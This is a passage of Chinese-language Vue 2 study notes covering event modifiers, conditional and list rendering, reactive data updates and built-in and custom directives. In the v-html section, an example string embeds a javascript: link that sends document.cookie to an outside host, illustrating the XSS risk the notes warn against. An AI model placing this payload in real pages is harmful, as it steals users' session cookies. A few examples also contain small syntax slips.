请注意修饰键与常规按键不同，在和 `keyup` 事件一起用时，事件触发时修饰键必须处于按下状态。换句话说，只有在按住 `ctrl` 的情况下释放其它按键，才能触发 `keyup.ctrl`。而单单释放 `ctrl` 也不会触发事件。

 **`.exact` 修饰符**

> 2.5.0 新增

`.exact` 修饰符允许你控制由精确的系统修饰符组合触发的事件。

```html
<!-- 即使 Alt/shift 或 Shift 被一同按下时也会触发 -->
<button @click.ctrl="onClick">A</button>

<!-- 有且只有 Ctrl 被按下的时候才触发 -->
<button @click.ctrl.exact="onCtrlClick">A</button>

<!-- 没有任何系统修饰符被按下的时候才触发 -->
<button @click.exact="onClick">A</button>
```

### 鼠标事件(@mousemove)

按钮修饰符

> 2.1.0 新增

- `.left`
- `.right`
- `.middle`

这些修饰符会限制处理函数仅响应特定的鼠标按钮。

```html
<html>
	<head>
		<meta charset="utf-8" />
		<title></title>
	</head>
	<body>
		<div id="app">
			<p @mousemove="mm">
				x:{{x}}
				y:{{y}}
				<span  @mousemove.stop>鼠标移动到此即停止</span>
			</p>
		</div>
	</body>
	<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
	<script type="text/javascript">
		new Vue({
			el:'#app',
			data:{
				x:0,
				y:0
			},
			methods:{
				mm:function(event){
					this.x = event.clientX;
					this.y = event.clientY;
				},
				stopm:function(event){
					event.stopPropagation();
				}	
			}
		})
	</script>
</html>
```

当鼠标经过P标签区域内时，区域内就会显示X和Y轴的坐标，如果经过P标签内的Span标签内时，此时会调用事件属性mousemove.stop预定的效果，鼠标移动的效果将会被取消，X和Y不再显示信息。

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中常用的按键别名：
							回车 => enter
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。
							(3).指定按键  @keyup.ctrl.n 表示按下ctrl + n

				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">   //@keydown.huiche="showInfo"绑定的事件
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

![image-20231120202334720](vue%E7%AC%94%E8%AE%B0.assets/image-20231120202334720.png)

## 条件渲染(if)

### v-if 切换频率较低的场景

在 Vue 中，可以使用 v-if 指令实现条件渲染，用法与其他编程语言条件判断语句类似：

```html
<div v-if="type === 'A'">A</div>
<div v-else-if="type === 'B'">B</div>
<div v-else-if="type === 'C'">C</div>
<div v-else>Not A/B/C</div>
```

### v-show 切换频率较高的场景

带有 v-show 的元素始终会被渲染并保留在 DOM 中。v-show 只是简单地切换元素的 CSS 属性 display：

注意:warning:: v-show 不支持 `<template>` 元素，也不支持 v-else。

v-if和v-show之间有着看似相同的效果，但优化上却有区别。

```html
<html>
	<head>
		<meta charset="utf-8">
		<title></title>
	</head>
	<body>
			<p v-show="rich">
				有钱！
			</p>
			<p v-if="rich">
				有钱！
			</p>
			<button type="button" @click="rich=!rich">今晚彩票开奖</button>
		</div>
	</body>
	<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
	<script>
		new Vue({
			el:'#app',
			data:{
				flag:false,
				rich:false
			},
			methods:{
			}
		});

	</script>
</html>
```

通过点击“今晚彩票开奖”按钮，能切换rich的值，此时发现，v-if和v-show的显示状态都会来回切换。看起来是一样的，但通过查看控制台代码发现:

v-show实际会将p标签的css样式的display属性设为none来达到隐藏的效果。

<img src="vue%E7%AC%94%E8%AE%B0.assets/1646013563563-394e8ae4-8a8c-4e7a-8cd3-68c04af9d0b7.png" alt="img" style="zoom:80%;" />

而v-if是直接在页面上添加和删除p标签来达到效果，因此v-show在反复切换的应用场景下，效率比v-if更高。

<img src="vue%E7%AC%94%E8%AE%B0.assets/1646013576224-8e8ae787-878c-486b-bac9-2e224fdbe2d8.png" alt="img" style="zoom:67%;" />

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				条件渲染：
							1.v-if
										写法：
												(1).v-if="表达式" 
												(2).v-else-if="表达式"
												(3).v-else="表达式"
										适用于：切换频率较低的场景。
										特点：不展示的DOM元素直接被移除。
										使用: v-if与template的配合使用 
										注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

							2.v-show
										写法：v-show="表达式"
										适用于：切换频率较高的场景。
										特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
								
							3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
		
							表达式: 定义的属性可以直接那来用
						-->

		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- ①使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- ②使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->
			<!--字符串判断 v-if="title === '新增用户'"  -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

## 列表渲染(for)

建议绑定到`item.id`身上,使用每一项数据中稳定且唯一的标识作为 key！

### 数组迭代

我们用 v-for 指令根据一组数组的选项列表进行渲染。

```html
<ul id="example-1">
  <li v-for="(item, index) in [{ message: 'Foo' },{ message: 'Bar' }]" :key="index">
    {{ item.message }}
  </li>
</ul>
```

- 第一个参数: 被遍历的数组的每一项
- 第二个参数: 当前项的索引
- key: 唯一标识 (如果不提供 key 会报警告)

也可以用 of 替代 in 作为分隔符，因为它是最接近 JavaScript 迭代器的语法：

```html
<div v-for="item of items"></div>
```

### 对象迭代

除了数组，for-in 甚至可以对 Object 进行迭代

```html
<div v-for="(value, key, index) in {firstName: 'John', lastName: 'Doe', age: 30}">
  {{ index }}. {{ key }}: {{ value }}
</div>
```

- 第一个参数: 键值
- 第二个参数: 键名
- 第三个参数: 索引

注意:warning:: 在遍历对象时，是按 Object.keys() 的结果遍历，但是不能保证它的结果在不同的 JavaScript 引擎下是一致的。

### 整数迭代

v-for可以单独遍历一个简单的整数，比如：

```html
<div>
  <span v-for="n in 10">{{ n }} </span>
</div>
```

### 结合v-if使用

当 v-if 与 v-for 处于同一节点，v-for 的优先级比 v-if 更高，这意味着 v-if 将分别重复运行于每个 v-for 循环中。当你想为仅有的一些项渲染节点时，这种优先级的机制会十分有用。

```html
<li v-for="todo in todos" v-if="!todo.isComplete">
  {{ todo }}
</li>
```

而如果你的目的是有条件地跳过循环的执行，那么可以将 v-if 置于外层元素。

```html
<ul v-if="todos.length">
  <li v-for="todo in todos">
    {{ todo }}
  </li>
</ul>
<p v-else>No todos left!</p>
```

### 嵌套迭代

```html
<body>
<div id="app">
    <ul>
        <li v-for=" student in students">
        	<span v-for="(v,k,i) in student">{{i+1}}--{{k}}--{{v}}</span>
    	</li>
    </ul>
</div>
</body>

<script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
<script>
    new Vue({
    	el:'#app',
    	data:{
       	 	students:[
            	{
                	name:'小鱼',
                	age:20
                  	girl:'如花'
            	},
            	{
                	name:'小飞',
                	age:21,
                    girl: '翠花'
            	}
        	]
    	}
	});
</script>
```

![image-20231120200832517](vue%E7%AC%94%E8%AE%B0.assets/image-20231120200832517.png)

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-for指令:
						1.用于展示列表数据
						2.语法：v-for="(item, index) in xxx" :key="yyy"  //yyy就表示0,1,2....
						3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				
				<li v-for="(p,index) of persons" :key="index">  //遍历
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[//数组
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{//对象
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello' //字符串
				}
			})
		</script>
</html>
```

![image-20231120170957338](vue%E7%AC%94%E8%AE%B0.assets/image-20231120170957338.png)

## 列表渲染[数据更删改查]

### 过滤

`filter` 方法接受一个回调函数作为参数，这个回调函数定义了过滤的条件。箭头函数中的部分 `return p.name.indexOf(this.keyWord) !== -1` 表示对数组中的每个元素 `p`，检查其 `name` 属性是否包含 `this.keyWord`。如果 `name` 中包含 `this.keyWord`，则这个元素被保留在过滤后的数组中。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">  //遍历符合条件的
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				// 计算属性
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{   //过滤
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```

![image-20231120212908893](vue%E7%AC%94%E8%AE%B0.assets/image-20231120212908893.png)

### 排序

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						// 过滤
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							//排序
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```

![image-20231120220716499](vue%E7%AC%94%E8%AE%B0.assets/image-20231120220716499.png)

### 数据更删改查

vue2还需要这些, vue3就简单多了

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!--
			Vue监视数据的原理：
				1. vue会监视data中所有层次的数据。

				2. 如何监测对象中的数据？
								通过setter实现监视，且要在new Vue时就传入要监测的数据。
									(1).对象中后追加的属性，Vue默认不做响应式处理
									(2).如需给后添加的属性做响应式，请使用如下API：
													Vue.set(target，propertyName/index，value) 或 
													vm.$set(target，propertyName/index，value)

				3. 如何监测数组中的数据？
									通过包裹数组更新元素的方法实现，本质就是做了两件事：
										(1).调用原生对应的方法对数组进行更新。
										(2).重新解析模板，进而更新页面。

				4.在Vue修改数组中的某个元素一定要用如下方法：
							1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
							2.Vue.set() 或 vm.$set()
				
				特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>  //加上''表示字符串  不加表示变量
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				// 对象
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// 给对象添加属性
					Vue.set(this.student,'sex','男')
					//this.$set(this.student,'sex','男')
				},
				addFriend(){
					// 给属性添加新增(往前)
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					// 修改属性值
					this.student.friends[0].name = '张三'  //注意: this.student.friends[0] = 报错的
				},
				addHobby(){
					// 给属性添加新增(往后)
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby[0] = 报错的
					// this.student.hobby.splice(0,1,'开车')
					// 修改属性值
					Vue.set(this.student.hobby,0,'开车')
					//this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					// 过滤属性
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

![image-20231120221359726](vue%E7%AC%94%E8%AE%B0.assets/image-20231120221359726.png)

## 指令

### 内置指令

1.  v-text : 更新元素的textContent
2. v-html : 更新元素的innerHTML
3. v-if : 如果为true, 当前标签才会输出到页面
4. v-else: 如果为false, 当前标签才会输出到页面
5. v-show : 通过控制display 样式来控制显示/隐藏
6. v-for : 遍历数组/对象
7. v-on : 绑定事件监听, 一般简写为@
8. v-bind : 绑定解析表达式, 可以省略v-bind
9. v-model : 双向数据绑定
10.  v-cloak : 防止闪现, 与css 配合: [v-cloak] { display: none }

#### 1.v-text_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				我们学过的指令：
						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
						v-model	: 双向数据绑定
						v-for  	: 遍历数组/对象/字符串
						v-on   	: 绑定事件监听, 可简写为@
						v-if 	 	: 条件渲染（动态控制节点是否存存在）
						v-else 	: 条件渲染（动态控制节点是否存存在）
						v-show 	: 条件渲染 (动态控制节点是否展示)
				v-text指令：
						1.作用：向其所在的节点中渲染文本内容。和{{}}类似
						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则会翻译成对应标签。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div>你好，{{str}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div> 	<!-- //运行结果: '<h3>你好啊！</h3>' -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```

![image-20231120223145197](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223145197.png)

#### 2.v-html_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).必须要在可信的内容上使用v-html，永不要用在用户提交的内容上！   --- 必须要在可信的内容上使用v-html
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

![image-20231120223130764](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223130764.png)

#### 3.v-cloak_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 
				v-cloak指令（没有值）：
						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。     -------  解决网速慢时页面展示出{{xxx}}的问题
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<!-- //放在后面不会阻塞 -->
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

#### 4.v-once_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-once指令：
						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。   ---------- 用于优化性能,以后该数据的改变不会改变
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

![](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223554967.png)

#### 5.v-pre_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-pre指令：
					1.跳过其所在节点的编译过程。
					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。 
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

![image-20231120223712618](vue%E7%AC%94%E8%AE%B0.assets/image-20231120223712618.png)

### 自定义指令

#### 一、全局自定义指令

在 `main.js` 使用 `Vue.directive` 声明一个全局指令

比如注册一个全局自定义指令 `v-focus`，用于自动获取输入焦点 :

```javascript
Vue.directive('focus', {
  // 当被绑定的元素插入到 DOM 中时……
  inserted: function (el) {
    // 聚焦元素
    el.focus()
  }
})
```

使用的时候：

```html
<input v-focus>
```

#### 二、组件自定义指令

在组件中，可以使用 `directives` 定义指令，比如以下获取焦点的指令：<br />

```vue
<template>
  <div>
    <input type="text">
    <input type="text" v-focus>
  </div>
</template>

<script>
export default {
  directives: {
    focus: {
      // 指令的定义
      inserted (el) {
        el.focus()
      }
    }
  }
}
</script>
```

在 directives 对象下声明指令的具体名称(`directiveName`)，声明指令的 inserted 方法，用于指令插入时调用，在模板中指令使用 `v-directiveName` 调用。

#### 三、自定义指令钩子

##### 钩子函数

一个指令定义对象可以提供如下几个钩子函数 (均为可选)：

- `bind`：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。
- `inserted`：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。
- `update`：所在组件的 VNode 更新时调用，**但是可能发生在其子 VNode 更新之前**。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。
- `componentUpdated`：指令所在组件的 VNode **及其子 VNode** 全部更新后调用。
- `unbind`：只调用一次，指令与元素解绑时调用。

##### 钩子函数参数

指令钩子函数会被传入以下参数：

- `el`：指令所绑定的元素，可以用来直接操作 DOM 。
- `binding` ：一个对象，包含以下属性：
  - `name`：指令名，不包括 `v-` 前缀。
  - `value`：指令的绑定值，例如：`v-my-directive="1 + 1"` 中，绑定值为 `2`。
  - `oldValue`：指令绑定的前一个值，仅在 `update` 和 `componentUpdated` 钩子中可用。无论值是否改变都可用。
  - `expression`：字符串形式的指令表达式。例如 `v-my-directive="1 + 1"` 中，表达式为 `"1 + 1"`。
  - `arg`：传给指令的参数，可选。例如 `v-my-directive:foo` 中，参数为 `"foo"`。
  - `modifiers`：一个包含修饰符的对象。例如：`v-my-directive.foo.bar` 中，修饰符对象为 `{ foo: true, bar: true }`。
- `vnode`：Vue 编译生成的虚拟节点。
- `oldVnode`：上一个虚拟节点，仅在 `update` 和 `componentUpdated` 钩子中可用。

除了 `el` 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 [`dataset`](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/dataset) 来进行。

例如：

```html
<div id="hook-arguments-example" v-demo:foo.a.b="message"></div>
```

```javascript
Vue.directive('demo', {
  bind: function (el, binding, vnode) {
    var s = JSON.stringify
    el.innerHTML =
      'name: '       + s(binding.name) + '<br>' +
      'value: '      + s(binding.value) + '<br>' +
      'expression: ' + s(binding.expression) + '<br>' +
      'argument: '   + s(binding.arg) + '<br>' +
      'modifiers: '  + s(binding.modifiers) + '<br>' +
      'vnode keys: ' + Object.keys(vnode).join(', ')
  }
})

new Vue({
  el: '#hook-arguments-example',
  data: {
    message: 'hello!'
  }
})
```

输出：

```html
name: "demo"
value: "hello!"
expression: "message"
argument: "foo"
modifiers: {"a":true,"b":true}
vnode keys: tag, data, children, text, elm, ns, context, fnContext, fnOptions, fnScopeId, key, componentOptions, componentInstance, parent, raw, isStatic, isRootInsert, isComment, isCloned, isOnce, asyncFactory, asyncMeta, isAsyncPlaceholder
```

#### 四、自定义指令简写

在很多时候，我们只关心 `bind` 和 `update` 时触发相同行为，而不关心其它的钩子。可以这样写：

```javascript
Vue.directive('color-swatch', function (el, binding) {
  el.style.backgroundColor = binding.value
})
```

在组件中，可以简写为：

```javascript
directives: {
  txt (el, binding, vnode, oldVnode) {
    console.log(el) // <div>...</div>
    console.log(binding) // {name: "txt", rawName: "v-txt", value: 20, expression: "4*5", modifiers: {}}
    console.log(vnode) // VNode
    console.log(oldVnode) // VNode
    var s = JSON.stringify
    el.innerHTML =
      'name: ' + s(binding.name) + '<br>' +
      'rawName: ' + s(binding.rawName) + '<br>' +
      'value: ' + s(binding.value) + '<br>' +
      'expression: ' + s(binding.expression) + '<br>' +
      'argument: ' + s(binding.arg) + '<br>' +
      'modifiers: ' + s(binding.modifiers) + '<br>' +
      'vnode keys: ' + Object.keys(vnode).join(', ')
  }
}
```

#### 五、对象字面量

如果指令需要多个值，可以传入一个 JavaScript 对象字面量。记住，**指令函数能够接受所有合法的 JavaScript 表达式**。

```html
<div v-demo="{ color: 'white', text: 'hello!' }"></div>
```

```javascript
Vue.directive('demo', function (el, binding) {
  console.log(binding.value.color) // => "white"
  console.log(binding.value.text)  // => "hello!"
})
```

#### 六、动态指令参数

指令的参数可以是动态的。例如，在 `v-mydirective:[argument]="value"` 中，`argument` 参数可以根据组件实例数据进行更新！这使得自定义指令可以在应用中被灵活使用。

例如你想要创建一个自定义指令，用来通过固定布局将元素固定在页面上。我们可以像这样创建一个通过指令值来更新竖直位置像素值的自定义指令：

```html
<div id="baseexample">
  <p>Scroll down the page</p>
  <p v-pin="200">Stick me 200px from the top of the page</p>
</div>
```

```javascript
Vue.directive('pin', {
  bind: function (el, binding, vnode) {
    el.style.position = 'fixed'
    el.style.top = binding.value + 'px'
  }
})
new Vue({
  el: '#baseexample'
})
```

这会把该元素固定在距离页面顶部 200 像素的位置。但如果场景是我们需要把元素固定在左侧而不是顶部又该怎么办呢？这时使用动态参数就可以非常方便地根据每个组件实例来进行更新。

```html
<div id="dynamicexample">
  <h3>Scroll down inside this section ↓</h3>
  <p v-pin:[direction]="200">I am pinned onto the page at 200px to the left.</p>
</div>
```

```javascript
Vue.directive('pin', {
  bind: function (el, binding, vnode) {
    el.style.position = 'fixed'
    var s = (binding.arg == 'left' ? 'left' : 'top')
    el.style[s] = binding.value + 'px'
  }
})
new Vue({
  el: '#dynamicexample',
  data: function () {
    return {
      direction: 'left'
    }
  }
})
```

#### 六、综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
				自定义指令总结：
						一、定义语法：
									(1).局部指令：
												new Vue({															new Vue({
													directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
												}) 																		})
									(2).全局指令：
													Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)


								1. 注册全局指令
								Vue.directive('my-directive', function(el, binding){
									el.innerHTML = binding.value.toupperCase()
								})

								2. 注册局部指令
								directives : {
									'my-directive' : {
										bind (el, binding) {
